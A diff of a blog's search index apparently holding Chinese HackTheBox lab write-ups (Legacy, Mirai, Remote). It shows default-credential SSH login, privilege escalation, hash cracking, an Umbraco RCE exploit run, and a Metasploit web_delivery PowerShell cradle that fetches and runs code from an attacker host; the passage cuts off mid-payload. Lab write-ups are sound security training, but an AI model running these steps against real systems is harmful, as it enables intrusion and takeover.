+    <url>/Hackthebox/htb/htb-legacy/</url>
+    <content><![CDATA[<style>.cbukejzubxmw{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="cbukejzubxmw">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Windows</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-legacy/image-20250201192659015.png" class="" title="Nmap">
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一个开了445端口的Windows XP，可以试试ms08067</p>
+<img src="/Hackthebox/htb/htb-legacy/image-20250201193355321.png" class="" title="msfconsole">
+
+<table>
+<thead>
+<tr>
+<th align="left">Flag</th>
+<th align="left">Path</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Flag1</td>
+<td align="left">C:\Documents and Settings\john\Desktop\user.txt</td>
+</tr>
+<tr>
+<td align="left">Flag2</td>
+<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
+</tr>
+</tbody></table>
+]]></content>
+      <categories>
+        <category>Hackthebox</category>
+      </categories>
+      <tags>
+        <tag>CVE</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>HTB-Love</title>
     <url>/Hackthebox/htb/htb-love/</url>
-    <content><![CDATA[<style>.wvjmmhdglovm{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="wvjmmhdglovm">
+    <content><![CDATA[<style>.wjgqvxpnsrat{zoom:50%;}</style><img src="/Hackthebox/htb/htb-love/c00774d8d806b82c709c596937a92d14.png" class="wjgqvxpnsrat">
 
 <span id="more"></span>
 
@@ -984,57 +980,9 @@
       </tags>
   </entry>
   <entry>
-    <title>HTB-Legacy</title>
-    <url>/Hackthebox/htb/htb-legacy/</url>
-    <content><![CDATA[<style>.qikpmfrpmctc{zoom:50%;}</style><img src="/Hackthebox/htb/htb-legacy/60dc190c4c015cfe3a3aef9b5afca254.png" class="qikpmfrpmctc">
-
-<span id="more"></span>
-
-<table>
-<thead>
-<tr>
-<th align="left">OS</th>
-<th align="left">Difficulty</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Windows</td>
-<td align="left">Easy</td>
-</tr>
-</tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-legacy/image-20250201192659015.png" class="" title="Nmap">
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>一个开了445端口的Windows XP，可以试试ms08067</p>
-<img src="/Hackthebox/htb/htb-legacy/image-20250201193355321.png" class="" title="msfconsole">
-
-<table>
-<thead>
-<tr>
-<th align="left">Flag</th>
-<th align="left">Path</th>
-</tr>
-</thead>
-<tbody><tr>
-<td align="left">Flag1</td>
-<td align="left">C:\Documents and Settings\john\Desktop\user.txt</td>
-</tr>
-<tr>
-<td align="left">Flag2</td>
-<td align="left">C:\Documents and Settings\Administrator\Desktop\root.txt</td>
-</tr>
-</tbody></table>
-]]></content>
-      <categories>
-        <category>Hackthebox</category>
-      </categories>
-      <tags>
-        <tag>CVE</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>HTB-Shocker</title>
-    <url>/Hackthebox/htb/htb-shocker/</url>
-    <content><![CDATA[<style>.sihrbuzgvwsz{zoom:50%;}</style><img src="/Hackthebox/htb/htb-shocker/efef52a0fb63d9c8db0ab6e50cb6ac79.png" class="sihrbuzgvwsz">
+    <title>HTB-Mirai</title>
+    <url>/Hackthebox/htb/htb-mirai/</url>
+    <content><![CDATA[<style>.ioindknqxcfs{zoom:50%;}</style><img src="/Hackthebox/htb/htb-mirai/4ef1ea77e69185063d4200d7d0142baa.png" class="ioindknqxcfs">
 
 <span id="more"></span>
 
@@ -1050,22 +998,27 @@
 <td>Easy</td>
 </tr>
 </tbody></table>
-<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><img src="/Hackthebox/htb/htb-shocker/image-20250216093127462.png" class="" title="Nmap">
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap 10.10.10.48 -sV  -sC -p- -T4 --min-rate 1000 -e tun0 </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-02 11:57 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.48</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 65343 closed tcp ports (reset), 186 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   1024 aa:ef:5c:e0:8e:86:97:82:47:ff:4a:e5:40:18:90:c5 (DSA)</span><br><span class="line">|   2048 e8:c1:9d:c5:43:ab:fe:61:23:3b:d7:e4:af:9b:74:18 (RSA)</span><br><span class="line">|   256 b6:a0:78:38:d0:c8:10:94:8b:44:b2:ea:a0:17:42:2b (ECDSA)</span><br><span class="line">|_  256 4d:68:40:f7:20:c4:e5:52:80:7a:44:38:b8:a2:a7:52 (ED25519)</span><br><span class="line">53/tcp    open  domain  dnsmasq 2.76</span><br><span class="line">| dns-nsid: </span><br><span class="line">|_  bind.version: dnsmasq-2.76</span><br><span class="line">80/tcp    open  http    lighttpd 1.4.35</span><br><span class="line">|_http-title: Site doesn<span class="string">&#x27;t have a title (text/html; charset=UTF-8).</span></span><br><span class="line"><span class="string">|_http-server-header: lighttpd/1.4.35</span></span><br><span class="line"><span class="string">1686/tcp  open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)</span></span><br><span class="line"><span class="string">32400/tcp open  http    Plex Media Server httpd</span></span><br><span class="line"><span class="string">|_http-title: Unauthorized</span></span><br><span class="line"><span class="string">|_http-cors: HEAD GET POST PUT DELETE OPTIONS</span></span><br><span class="line"><span class="string">| http-auth: </span></span><br><span class="line"><span class="string">| HTTP/1.1 401 Unauthorized\x0D</span></span><br><span class="line"><span class="string">|_  Server returned status 401 but no WWW-Authenticate header.</span></span><br><span class="line"><span class="string">|_http-favicon: Plex</span></span><br><span class="line"><span class="string">32469/tcp open  upnp    Platinum UPnP 1.0.5.13 (UPnP/1.0 DLNADOC/1.50)</span></span><br><span class="line"><span class="string">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span></span><br><span class="line"><span class="string">Nmap done: 1 IP address (1 host up) scanned in 122.17 seconds</span></span><br></pre></td></tr></table></figure>
 
-<p>开放了80(HTTP) 和2222(SSH)</p>
-<h3 id="Fuzzing"><a href="#Fuzzing" class="headerlink" title="Fuzzing"></a>Fuzzing</h3><p>使用dirb进行目录猜解，发现 <code>/cgi-bin/</code>目录</p>
-<img src="/Hackthebox/htb/htb-shocker/image-20250216095828722.png" class="" title="dirb">
+<p>添加本地域名解析到hosts</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;10.10.10.48 mirai.htb&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/hosts</span><br></pre></td></tr></table></figure>
 
-<p>然后使用Fuff 继续猜解，找到一个 <code>user.sh</code></p>
-<img src="/Hackthebox/htb/htb-shocker/image-20250216095724470.png" class="" title="Fuff">
+<p>访问目标 <a href="http://mirai.htb/">http://mirai.htb</a> ,右键查看源码，找到一个路径</p>
+<img src="/Hackthebox/htb/htb-mirai/image-20250302122107403.png" class="" title="源码">访问/admin 可以看到是树苺派
 
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用msfconsole <code>multi/http/apache_mod_cgi_bash_env_exec</code> 模块</p>
-<img src="/Hackthebox/htb/htb-shocker/image-20250216101417329.png" class="" title="GetShell">
+<img src="/Hackthebox/htb/htb-mirai/image-20250302122612935.png" class="" title="面板">
 
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>使用树苺派默认凭证 pi:raspberry 登录SSH</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ ssh pi@mirai.htb              </span><br><span class="line">The authenticity of host <span class="string">&#x27;mirai.htb (10.10.10.48)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ED25519 key fingerprint is SHA256:TL7joF/Kz3rDLVFgQ1qkyXTnVQBTYrV44Y2oXyjOa60.</span></span><br><span class="line"><span class="string">This key is not known by any other names.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>mirai.htb<span class="string">&#x27; (ED25519) to the list of known hosts.</span></span><br><span class="line"><span class="string">pi@mirai.htb&#x27;</span>s password: </span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU/Linux system are free software;</span><br><span class="line">the exact distribution terms <span class="keyword">for</span> each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> /usr/share/doc/*/copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">Last login: Sun Aug 27 14:47:50 2017 from localhost</span><br><span class="line"></span><br><span class="line">SSH is enabled and the default password <span class="keyword">for</span> the <span class="string">&#x27;pi&#x27;</span> user has not been changed.</span><br><span class="line">This is a security risk - please login as the <span class="string">&#x27;pi&#x27;</span> user and <span class="built_in">type</span> <span class="string">&#x27;passwd&#x27;</span> to <span class="built_in">set</span> a new password.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SSH is enabled and the default password <span class="keyword">for</span> the <span class="string">&#x27;pi&#x27;</span> user has not been changed.</span><br><span class="line">This is a security risk - please login as the <span class="string">&#x27;pi&#x27;</span> user and <span class="built_in">type</span> <span class="string">&#x27;passwd&#x27;</span> to <span class="built_in">set</span> a new password.</span><br><span class="line"></span><br><span class="line">pi@raspberrypi:~ $ $ <span class="built_in">id</span></span><br><span class="line">uid=1000(pi) gid=1000(pi) <span class="built_in">groups</span>=1000(pi),4(adm),20(dialout),24(cdrom),27(<span class="built_in">sudo</span>),29(audio),44(video),46(plugdev),60(games),100(<span class="built_in">users</span>),101(input),108(netdev),117(i2c),998(gpio),999(spi)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>运行sudo -l 可以看到能直接切换root用户，查看root.txt 提示备份在USB stick</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">pi@raspberrypi:~ $ <span class="built_in">sudo</span> -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> pi on localhost:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</span><br><span class="line"></span><br><span class="line">User pi may run the following commands on localhost:</span><br><span class="line">    (ALL : ALL) ALL</span><br><span class="line">    (ALL) NOPASSWD: ALL</span><br><span class="line">pi@raspberrypi:~ $ <span class="built_in">sudo</span> -i</span><br><span class="line"></span><br><span class="line">SSH is enabled and the default password <span class="keyword">for</span> the <span class="string">&#x27;pi&#x27;</span> user has not been changed.</span><br><span class="line">This is a security risk - please login as the <span class="string">&#x27;pi&#x27;</span> user and <span class="built_in">type</span> <span class="string">&#x27;passwd&#x27;</span> to <span class="built_in">set</span> a new password.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">SSH is enabled and the default password <span class="keyword">for</span> the <span class="string">&#x27;pi&#x27;</span> user has not been changed.</span><br><span class="line">This is a security risk - please login as the <span class="string">&#x27;pi&#x27;</span> user and <span class="built_in">type</span> <span class="string">&#x27;passwd&#x27;</span> to <span class="built_in">set</span> a new password.</span><br><span class="line"></span><br><span class="line">root@raspberrypi:~# <span class="built_in">ls</span></span><br><span class="line">root.txt</span><br><span class="line">root@raspberrypi:~# <span class="built_in">cat</span> root.txt </span><br><span class="line">I lost my original root.txt! I think I may have a backup on my USB stick...</span><br><span class="line">root@raspberrypi:~# </span><br></pre></td></tr></table></figure>
 
-<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>使用sudo -l 发现可以利用perl 进行提权 <code>sudo /usr/bin/perl -e &#39;exec &quot;/bin/bash&quot;&#39;</code></p>
-<img src="/Hackthebox/htb/htb-shocker/image-20250216103049798.png" class="" title="GetShell">
+<p>查看驱动清单，进入&#x2F;media&#x2F;usbstick，查看 damnit.txt </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspberrypi:/# <span class="built_in">df</span> -hl</span><br><span class="line">Filesystem      Size  Used Avail Use% Mounted on</span><br><span class="line">aufs            8.5G  2.8G  5.3G  34% /</span><br><span class="line">tmpfs           100M  4.8M   96M   5% /run</span><br><span class="line">/dev/sda1       1.3G  1.3G     0 100% /lib/live/mount/persistence/sda1</span><br><span class="line">/dev/loop0      1.3G  1.3G     0 100% /lib/live/mount/rootfs/filesystem.squashfs</span><br><span class="line">tmpfs           250M     0  250M   0% /lib/live/mount/overlay</span><br><span class="line">/dev/sda2       8.5G  2.8G  5.3G  34% /lib/live/mount/persistence/sda2</span><br><span class="line">devtmpfs         10M     0   10M   0% /dev</span><br><span class="line">tmpfs           250M  8.0K  250M   1% /dev/shm</span><br><span class="line">tmpfs           5.0M  4.0K  5.0M   1% /run/lock</span><br><span class="line">tmpfs           250M     0  250M   0% /sys/fs/cgroup</span><br><span class="line">tmpfs           250M  8.0K  250M   1% /tmp</span><br><span class="line">/dev/sdb        8.7M   93K  7.9M   2% /media/usbstick</span><br><span class="line">tmpfs            50M     0   50M   0% /run/user/999</span><br><span class="line">tmpfs            50M     0   50M   0% /run/user/1000</span><br><span class="line">root@raspberrypi:/# <span class="built_in">cd</span> /media/usbstick</span><br><span class="line">root@raspberrypi:/media/usbstick# <span class="built_in">ls</span></span><br><span class="line">damnit.txt  lost+found</span><br><span class="line"></span><br><span class="line">root@raspberrypi:/media/usbstick# <span class="built_in">cat</span> damnit.txt </span><br><span class="line">Damnit! Sorry man I accidentally deleted your files off the USB stick.</span><br><span class="line">Do you know <span class="keyword">if</span> there is any way to get them back?</span><br><span class="line"></span><br><span class="line">-James</span><br></pre></td></tr></table></figure>
+
+<p>使用strings 查看字符串</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@raspberrypi:/media/usbstick# strings /dev/sdb </span><br><span class="line">&gt;r &amp;</span><br><span class="line">/media/usbstick</span><br><span class="line">lost+found</span><br><span class="line">root.txt</span><br><span class="line">damnit.txt</span><br><span class="line">&gt;r &amp;</span><br><span class="line">&gt;r &amp;</span><br><span class="line">/media/usbstick</span><br><span class="line">lost+found</span><br><span class="line">root.txt</span><br><span class="line">damnit.txt</span><br><span class="line">&gt;r &amp;</span><br><span class="line">/media/usbstick</span><br><span class="line">2]8^</span><br><span class="line">lost+found</span><br><span class="line">root.txt</span><br><span class="line">damnit.txt</span><br><span class="line">&gt;r &amp;</span><br><span class="line">3d3e483143ff12ec505d026fa13e020b</span><br><span class="line">Damnit! Sorry man I accidentally deleted your files off the USB stick.</span><br><span class="line">Do you know <span class="keyword">if</span> there is any way to get them back?</span><br><span class="line">-James</span><br></pre></td></tr></table></figure>
 
 <table>
 <thead>
@@ -1076,11 +1029,11 @@
 </thead>
 <tbody><tr>
 <td align="left">Flag1</td>
-<td align="left">&#x2F;home&#x2F;shelly&#x2F;user.txt</td>
+<td align="left">&#x2F;home&#x2F;pi&#x2F;Desktop&#x2F;user.txt</td>
 </tr>
 <tr>
 <td align="left">Flag2</td>
-<td align="left">&#x2F;root&#x2F;root.txt</td>
+<td align="left">strings &#x2F;dev&#x2F;sdb</td>
 </tr>
 </tbody></table>
 ]]></content>
@@ -1088,13 +1041,13 @@
         <category>Hackthebox</category>
       </categories>
       <tags>
-        <tag>Shellshock</tag>
+        <tag>默认密码</tag>
       </tags>
   </entry>
   <entry>
     <title>HTB-Optimum</title>
     <url>/Hackthebox/htb/htb-optimum/</url>
-    <content><![CDATA[<style>.sjqtlrpcmtrj{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="sjqtlrpcmtrj">
+    <content><![CDATA[<style>.ioxpoyfqhuuf{zoom:50%;}</style><img src="/Hackthebox/htb/htb-optimum/bb09ffeaffe2f5220a1d591bb7b4f95e.png" class="ioxpoyfqhuuf">
 
 <span id="more"></span>
 
@@ -1154,9 +1107,143 @@
       </tags>
   </entry>
   <entry>
+    <title>HTB-Remote</title>
+    <url>/Hackthebox/htb/htb-remote/</url>
+    <content><![CDATA[<style>.sbalneurfhpd{zoom:50%;}</style><img src="/Hackthebox/htb/htb-remote/8d7c152dc9c28c9556b07dc724c6a37b.png" class="sbalneurfhpd">
+
+<span id="more"></span>
+
+<table>
+<thead>
+<tr>
+<th align="left">OS</th>
+<th align="left">Difficulty</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Windows</td>
+<td align="left">Easy</td>
+</tr>
+</tbody></table>
+<h3 id="Nmap-Scan"><a href="#Nmap-Scan" class="headerlink" title="Nmap Scan"></a>Nmap Scan</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ nmap 10.10.10.180 -sV  -p- -T4 --min-rate 1000 -e tun0 </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-23 20:44 CST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.10.180</span><br><span class="line">Host is up (0.13s latency).</span><br><span class="line">Not shown: 65516 closed tcp ports (reset)</span><br><span class="line">PORT      STATE    SERVICE       VERSION</span><br><span class="line">21/tcp    open     ftp           Microsoft ftpd</span><br><span class="line">80/tcp    open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">111/tcp   open     rpcbind       2-4 (RPC <span class="comment">#100000)</span></span><br><span class="line">135/tcp   open     msrpc         Microsoft Windows RPC</span><br><span class="line">139/tcp   open     netbios-ssn   Microsoft Windows netbios-ssn</span><br><span class="line">445/tcp   open     microsoft-ds?</span><br><span class="line">2049/tcp  open     nlockmgr      1-4 (RPC <span class="comment">#100021)</span></span><br><span class="line">5985/tcp  open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">15264/tcp filtered unknown</span><br><span class="line">22011/tcp filtered unknown</span><br><span class="line">47001/tcp open     http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</span><br><span class="line">49664/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49665/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49666/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49667/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49678/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49679/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">49680/tcp open     msrpc         Microsoft Windows RPC</span><br><span class="line">53739/tcp filtered unknown</span><br><span class="line">Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 251.51 seconds</span><br></pre></td></tr></table></figure>
+
+<p>首先尝试FTP(21)匿名登录，啥也没有，然后对NFS(2049)进行测试，发现网站备份文件，挂载后可以查找到admin凭证</p>
+<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ showmount -e 10.10.10.180              </span><br><span class="line">Export list <span class="keyword">for</span> 10.10.10.180:</span><br><span class="line">/site_backups (everyone)</span><br><span class="line">$ <span class="built_in">mkdir</span> /tmp/site_backups </span><br><span class="line">$ <span class="built_in">sudo</span> mount -t nfs 10.10.10.180:/site_backups /tmp/site_backups</span><br><span class="line">$ <span class="built_in">cd</span> /tmp/site_backups </span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">App_Browsers  aspnet_client  css           Media    Umbraco_Client</span><br><span class="line">App_Data      bin            default.aspx  scripts  Views</span><br><span class="line">App_Plugins   Config         Global.asax   Umbraco  Web.config</span><br><span class="line">$ <span class="built_in">cd</span> App_Data </span><br><span class="line">strings Umbraco.sdf | grep admin</span><br><span class="line">Administratoradmindefaulten-US</span><br><span class="line">Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d</span><br><span class="line">Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d</span><br><span class="line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50</span><br><span class="line">adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa&#123;<span class="string">&quot;hashAlgorithm&quot;</span>:<span class="string">&quot;SHA1&quot;</span>&#125;admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f</span><br><span class="line">User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;192.168.195.1User <span class="string">&quot;admin&quot;</span> &lt;admin@htb.local&gt;umbraco/user/password/changepassword change</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+
+<p>将获取到的密码hash进行破解，将收集到的用户名密码备用</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> <span class="string">&#x27;b8be16afba8c314ad33d812f22a04991b90e2aaa&#x27;</span> &gt; sha1  </span><br><span class="line">$ john sha1 --format=Raw-SHA1 --wordlist=/usr/share/wordlists/rockyou.txt </span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password <span class="built_in">hash</span> (Raw-SHA1 [SHA1 256/256 AVX2 8x])</span><br><span class="line">Warning: no OpenMP support <span class="keyword">for</span> this <span class="built_in">hash</span> <span class="built_in">type</span>, consider --fork=8</span><br><span class="line">Press <span class="string">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class="keyword">for</span> status</span><br><span class="line">baconandcheese   (?)     </span><br><span class="line">1g 0:00:00:00 DONE (2025-02-23 21:45) 1.694g/s 16650Kp/s 16650Kc/s 16650KC/s baconandchipies1..bacon918</span><br><span class="line">Use the <span class="string">&quot;--show --format=Raw-SHA1&quot;</span> options to display all of the cracked passwords reliably</span><br><span class="line">Session completed.                          </span><br></pre></td></tr></table></figure>
+
+<p>添加本地域名解析到hosts文件，并访问站点，可以找到一个登录页面</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;10.10.10.180 remote.htb&#x27;</span> | <span class="built_in">sudo</span> <span class="built_in">tee</span> -a /etc/hosts </span><br></pre></td></tr></table></figure>
+
+<img src="/Hackthebox/htb/htb-remote/image-20250223220027043.png" class="" title="访问网站">
+
+<p>使用收集到的用户名密码，登录网站，获取网站版本</p>
+<img src="/Hackthebox/htb/htb-remote/image-20250223220241146.png" class="" title="登录页面">
+
+<img src="/Hackthebox/htb/htb-remote/image-20250223220501688.png" class="" title="查看版本">
+
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>通过检索可以在github 找到一个利用脚本：<a href="https://github.com/Jonoans/Umbraco-RCE">https://github.com/Jonoans/Umbraco-RCE</a></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python exploit.py -u admin@htb.local -p baconandcheese -w <span class="string">&#x27;http://remote.htb&#x27;</span> -i 10.10.16.30</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to :: on port 4444: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on :::4444: Got connection from ::ffff:10.10.10.180 on port 49695</span><br><span class="line">[+] Trying to <span class="built_in">bind</span> to :: on port 4445: Done</span><br><span class="line">[+] Waiting <span class="keyword">for</span> connections on :::4445: Got connection from ::ffff:10.10.10.180 on port 49696</span><br><span class="line">[*] Logging <span class="keyword">in</span> at http://remote.htb/umbraco/backoffice/UmbracoApi/Authentication/PostLogin</span><br><span class="line">[*] Exploiting at http://remote.htb/umbraco/developer/Xslt/xsltVisualize.aspx</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">PS C:\windows\system32\inetsrv&gt; <span class="built_in">whoami</span></span><br><span class="line">iis apppool\defaultapppool</span><br><span class="line">PS C:\windows\system32\inetsrv&gt;  </span><br></pre></td></tr></table></figure>
+
+<p>将shell 转移到msfconsole：使用<code>multi/script/web_delivery</code> 复制生成的powershell链接，在获取到的shell 上执行，成功获取到shell，查看系统信息为 Windows Server 2019 (10.0 Build 17763)</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msf6 exploit(multi/script/web_delivery) &gt; show targets </span><br><span class="line"></span><br><span class="line">Exploit targets:</span><br><span class="line">=================</span><br><span class="line"></span><br><span class="line">    Id  Name</span><br><span class="line">    --  ----</span><br><span class="line">=&gt;  0   Python</span><br><span class="line">    1   PHP</span><br><span class="line">    2   PSH</span><br><span class="line">    3   Regsvr32</span><br><span class="line">    4   pubprn</span><br><span class="line">    5   SyncAppvPublishingServer</span><br><span class="line">    6   PSH (Binary)</span><br><span class="line">    7   Linux</span><br><span class="line">    8   Mac OS X</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> target 2</span><br><span class="line">target =&gt; 2</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">payload =&gt; windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LPORT 4446</span><br><span class="line">LPORT =&gt; 4446</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> LHOST tun0 </span><br><span class="line">LHOST =&gt; 10.10.16.30</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; <span class="built_in">set</span> SRVPORT 8088</span><br><span class="line">SRVPORT =&gt; 8088</span><br><span class="line">msf6 exploit(multi/script/web_delivery) &gt; exploit </span><br><span class="line">[*] Started reverse TCP handler on 10.10.16.30:4446 </span><br><span class="line">[*] Using URL: http://10.10.16.30:8088/1JHqco9l</span><br><span class="line">[*] Server started.</span><br><span class="line">[*] Run the following <span class="built_in">command</span> on the target machine:</span><br><span class="line">powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJAB6AG4AVABYAGcAPQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AGkAZgAoAFsAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAFAAcgBvAHgAeQBdADoAOgBHAGUAdABEAGUAZgBhAHUAbAB0AFAAcgBvAHgAeQAoACkALgBhAGQAZAByAGUAcwBzACAALQBuAGUAIAAkAG4AdQBsAGwAKQB7ACQAegBuAFQAWABnAC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7ACQAegBuAFQAWABnAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4AMwAwADoAOAAwADgAOAAvADEASgBIAHEAYwBvADkAbAAvAEUATABkAEkAMgBNAFUAUwAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBi